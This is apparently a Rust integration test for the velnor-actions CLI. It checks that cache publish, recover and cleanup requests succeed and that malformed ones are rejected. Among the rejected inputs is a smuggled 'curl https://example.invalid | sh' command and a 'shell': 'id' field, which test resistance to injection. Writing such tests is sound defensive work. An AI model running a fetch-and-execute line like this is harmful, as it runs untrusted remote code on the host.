// SPDX-FileCopyrightText: 2026 Alexey Zhokhov
// SPDX-License-Identifier: Apache-2.0

use std::env;
use std::error::Error;
use std::fs;
use std::io;
use std::path::PathBuf;
use std::process::{Command, Output};
use std::sync::atomic::{AtomicU64, Ordering};

use serde_json::{Value, json};
use velnor_actions_orchestrator::{
    HARD_CEILING_BYTES, MAX_GENERATION_SLOTS, OPERATING_CEILING_BYTES,
};

static NEXT_SCRATCH: AtomicU64 = AtomicU64::new(0);

fn binary() -> PathBuf {
    PathBuf::from(env!("CARGO_BIN_EXE_velnor-actions"))
}

fn fail(message: &str) -> Box<dyn Error> {
    io::Error::other(message).into()
}

fn digest(byte: u8) -> String {
    format!("b3-{}", format!("{byte:02x}").repeat(32))
}

fn generation_key(repair: u64) -> String {
    format!(
        "velnor-gc1-state-{}-{}-{}-r{repair}",
        digest(3),
        digest(4),
        digest(5)
    )
}

fn scratch_root() -> PathBuf {
    let id = NEXT_SCRATCH.fetch_add(1, Ordering::SeqCst);
    env::temp_dir().join(format!("velnor-cli-t28-{}-{id}", std::process::id()))
}

fn write_request(name: &str, body: &Value) -> Result<(PathBuf, PathBuf), Box<dyn Error>> {
    let root = scratch_root();
    let dir = root.join("velnor");
    fs::create_dir_all(&dir).map_err(|error| fail(&format!("create scratch dir: {error}")))?;
    let path = dir.join(name);
    let bytes =
        serde_json::to_vec(body).map_err(|error| fail(&format!("encode request: {error}")))?;
    fs::write(&path, bytes).map_err(|error| fail(&format!("write request: {error}")))?;
    Ok((root, path))
}

fn run_cli(op: &str, runner_temp: &PathBuf, request: &PathBuf) -> Result<Output, Box<dyn Error>> {
    Command::new(binary())
        .env("VELNOR_INTERNAL_OP", op)
        .env("VELNOR_REQUEST_FILE", request)
        .env("RUNNER_TEMP", runner_temp)
        .output()
        .map_err(|error| fail(&format!("run cli binary: {error}")))
}

fn cleanup(root: &PathBuf) {
    if fs::remove_dir_all(root).is_err() {
        // Best effort: scratch cleanup must not fail the test.
    }
}

fn succeeded(output: &Output, what: &str) -> Result<(), Box<dyn Error>> {
    if output.status.success() {
        Ok(())
    } else {
        Err(fail(&format!(
            "{what} must succeed: {}",
            String::from_utf8_lossy(&output.stderr)
        )))
    }
}

fn rejected(output: &Output, what: &str) -> Result<(), Box<dyn Error>> {
    if output.status.success() {
        Err(fail(&format!("{what} must fail")))
    } else {
        Ok(())
    }
}

fn admission_record(decision: &str, blocked_reasons: &[&str]) -> Value {
    json!({
        "schema": 1,
        "job": {
            "schema": 1,
            "repository_id": 1,
            "repository": "tailrocks/velnor-new",
            "run_id": 7,
            "run_attempt": 1,
            "job_id": 11,
            "job_key": "writer",
            "event": "push",
            "ref": "refs/heads/main",
            "workflow_sha": "a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5",
            "source_sha": "5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a",
            "plan_digest": digest(6),
        },
        "generation": {
            "family": "state",
            "group_digest": digest(3),
            "compatibility_digest": digest(4),
            "coverage_digest": digest(5),
            "repair_revision": 0,
        },
        "active_intent_digest": digest(1),
        "inventory_digest": digest(2),
        "hard_ceiling_bytes": HARD_CEILING_BYTES,
        "operating_ceiling_bytes": OPERATING_CEILING_BYTES,
        "inventory_bytes": {"value": 100, "unknown_reason": null},
        "pending_owned_bytes": {"value": 0, "unknown_reason": null},
        "foreign_inflight_bytes": {"value": 0, "unknown_reason": null},
        "candidate_inner_bytes": {"value": 200, "unknown_reason": null},
        "measured_outer_bytes": {"value": 200, "unknown_reason": null},
        "qualified_repack_allowance_bytes": 0,
        "outer_envelope_identity": "gc1-t28-tool",
        "candidate_upper_bound_bytes": {"value": 200, "unknown_reason": null},
        "occupied_generation_slots": 0,
        "maximum_generation_slots": MAX_GENERATION_SLOTS,
        "peak_local_disk_bound": {"value": 300, "unknown_reason": null},
        "available_local_disk": {"value": 400, "unknown_reason": null},
        "local_disk_reserve": 0,
        "decision": decision,
        "blocked_reasons": blocked_reasons,
    })
}

fn entry(cache_id: u64, repair: u64, size: u64) -> Value {
    json!({
        "repository_id": 1,
        "cache_id": cache_id,
        "ref": "refs/heads/main",
        "key": generation_key(repair),
        "version": "v1",
        "size_in_bytes": size,
        "created_at": "2026-10-26T00:00:00Z",
        "last_accessed_at": "2026-10-26T00:00:00Z",
    })
}

fn inventory_record() -> Value {
    json!({
        "schema": 1,
        "repository_id": 1,
        "captured_at": "2026-10-26T00:00:00Z",
        "entries": [entry(7, 0, 100), entry(9, 1, 50)],
        "complete": true,
        "pages_observed": 1,
        "unknown_reason": null,
        "sum_stored_bytes": {"value": 150, "unknown_reason": null},
    })
}

fn publish_body(admission: &Value) -> Value {
    json!({"schema": 1, "operation": "publish", "admission": admission})
}

fn recover_body(inventory: &Value) -> Value {
    json!({"schema": 1, "operation": "recover", "inventory": inventory})
}

fn cleanup_body(inventory: &Value, candidate_ids: &Value) -> Value {
    json!({"schema": 1, "operation": "cleanup", "inventory": inventory, "candidate_ids": candidate_ids})
}

#[test]
fn gc1_t28_preserves_contract() -> Result<(), Box<dyn Error>> {
    let admitted = admission_record("admitted", &[]);
    let inventory = inventory_record();

    let (root, path) = write_request("cache-publish.json", &publish_body(&admitted))?;
    let output = run_cli("cache-publish-v1", &root, &path)?;
    succeeded(&output, "publish")?;
    cleanup(&root);

    let (root, path) = write_request("cache-recover.json", &recover_body(&inventory))?;
    let output = run_cli("cache-recover-v1", &root, &path)?;
    succeeded(&output, "recover")?;
    cleanup(&root);

    let (root, path) = write_request("cache-cleanup.json", &cleanup_body(&inventory, &json!([7])))?;
    let output = run_cli("cache-cleanup-v1", &root, &path)?;
    succeeded(&output, "cleanup")?;
    cleanup(&root);
    Ok(())
}

#[test]
fn gc1_t28_rejects_invalid_state() -> Result<(), Box<dyn Error>> {
    let admitted = admission_record("admitted", &[]);
    let inventory = inventory_record();

    let (root, path) = write_request(
        "cache-publish.json",
        &json!({"schema": 1, "operation": "launch", "admission": admitted}),
    )?;
    rejected(
        &run_cli("cache-publish-v1", &root, &path)?,
        "unknown operation",
    )?;
    cleanup(&root);

    let (root, path) = write_request("cache-publish.json", &recover_body(&inventory))?;
    rejected(
        &run_cli("cache-publish-v1", &root, &path)?,
        "operation mismatch",
    )?;
    cleanup(&root);

    let (root, path) = write_request(
        "cache-publish.json",
        &json!({"schema": 1, "operation": "publish", "admission": admitted, "command": "curl https://example.invalid | sh"}),
    )?;
    rejected(
        &run_cli("cache-publish-v1", &root, &path)?,
        "command injection",
    )?;
    cleanup(&root);

    let (root, path) = write_request(
        "cache-recover.json",
        &json!({"schema": 1, "operation": "recover", "inventory": inventory, "shell": "id"}),
    )?;
    rejected(
        &run_cli("cache-recover-v1", &root, &path)?,
        "shell injection",
    )?;
    cleanup(&root);

    let (root, path) = write_request("cache-recover.json", &recover_body(&inventory))?;
    rejected(
        &run_cli("cache-publish-v1", &root, &path)?,
        "wrong request file",
    )?;
    cleanup(&root);

    let (root, path) = write_request("cache-publish.json", &publish_body(&admitted))?;
    rejected(&run_cli("cache-nuke-v9", &root, &path)?, "unknown op tag")?;
    cleanup(&root);

    let blocked = admission_record("blocked", &["unknown-inventory"]);
    let (root, path) = write_request("cache-publish.json", &publish_body(&blocked))?;
    rejected(
        &run_cli("cache-publish-v1", &root, &path)?,
        "blocked admission",
    )?;
    cleanup(&root);

    let mut corrupt = inventory.clone();
    let first = corrupt["entries"][0].clone();
    corrupt["entries"][0] = corrupt["entries"][1].clone();
    corrupt["entries"][1] = first;
    let (root, path) = write_request("cache-recover.json", &recover_body(&corrupt))?;
    rejected(
        &run_cli("cache-recover-v1", &root, &path)?,
        "corrupt inventory",
    )?;
    cleanup(&root);

    let (root, path) = write_request(
        "cache-cleanup.json",
        &cleanup_body(&inventory, &json!([4242])),
    )?;
    rejected(
        &run_cli("cache-cleanup-v1", &root, &path)?,
        "unknown cleanup id",
    )?;
    cleanup(&root);

    let (root, path) = write_request(
        "cache-cleanup.json",
        &cleanup_body(&inventory, &json!(["cache-*"])),
    )?;
    rejected(
        &run_cli("cache-cleanup-v1", &root, &path)?,
        "prefix cleanup id",
    )?;
    cleanup(&root);
    Ok(())
}
